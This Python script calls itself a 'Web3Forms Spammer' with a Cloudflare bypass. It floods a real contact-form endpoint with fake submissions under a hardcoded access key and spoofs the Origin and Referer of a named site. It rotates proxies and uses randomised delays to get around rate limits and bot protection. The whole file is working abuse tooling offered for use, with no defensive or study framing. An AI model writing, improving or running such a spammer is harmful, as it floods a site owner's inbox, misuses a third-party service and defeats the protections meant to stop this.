import cloudscraper
import random
import time
import os
from datetime import datetime

# ========================= CONFIG =========================
URL = "https://api.web3forms.com/submit"
ACCESS_KEY = "460b8135-0bf3-4091-9e14-794027910920"

PROXIES_FILE = "proxies.txt"
BATCH_SIZE = 3
NUM_BATCHES = 20

RANDOMIZE = True
# =========================================================

def load_proxies():
    if not os.path.exists(PROXIES_FILE):
        print("[-] proxies.txt not found!")
        return []
    with open(PROXIES_FILE, "r", encoding="utf-8") as f:
        proxies = [line.strip() for line in f if line.strip()]
    print(f"[+] Loaded {len(proxies)} proxies")
    return proxies

def send_request(scraper, name, email, message):
    payload = {
        "access_key": ACCESS_KEY,
        "name": name,
        "email": email,
        "message": message,
        "subject": "New Contact Form Submission"
    }

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/149.0.0.0 Safari/537.36",
        "Accept": "application/json",
        "Origin": "https://govirals.io",
        "Referer": "https://govirals.io/",
    }

    try:
        r = scraper.post(URL, json=payload, headers=headers, timeout=30)
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        if r.status_code == 200:
            print(f"[{timestamp}] ✅ SUCCESS | {email}")
            return True
        else:
            print(f"[{timestamp}] ❌ Failed ({r.status_code})")
            if len(r.text) < 300:
                print(f"    {r.text}")
            return False
    except Exception as e:
        print(f"[{timestamp}] ❌ Error: {e}")
        return False


if __name__ == "__main__":
    print("[*] Web3Forms Spammer - Cloudflare Bypass (cloudscraper)")
    
    proxies = load_proxies()
    if not proxies:
        print("No proxies loaded.")
        exit()

    success_count = 0
    proxy_index = 0

    for batch in range(NUM_BATCHES):
        proxy_str = proxies[proxy_index % len(proxies)]
        
        # Create fresh scraper with proxy
        scraper = cloudscraper.create_scraper()
        scraper.proxies = {
            "http": f"http://{proxy_str}",
            "https": f"http://{proxy_str}"
        }
        
        print(f"\n{'='*70}")
        print(f"BATCH {batch+1}/{NUM_BATCHES} | Proxy: {proxy_str[:60]}...")
        print(f"{'='*70}")

        for i in range(BATCH_SIZE):
            if RANDOMIZE:
                name = f"User{random.randint(10000,999999)}"
                email = f"test{random.randint(100000000,999999999)}@gmail.com"
                message = random.choice(["Hello from automation", "Test submission", "Hi there!", "Working?"])
            else:
                name = "vczxxc"
                email = "cxfebzcxz@gmail.com"
                message = "hi"

            if send_request(scraper, name, email, message):
                success_count += 1

            time.sleep(random.uniform(2, 5))

        proxy_index += 1
        time.sleep(random.uniform(6, 12))

    print(f"\n[+] Finished! Total Success: {success_count}")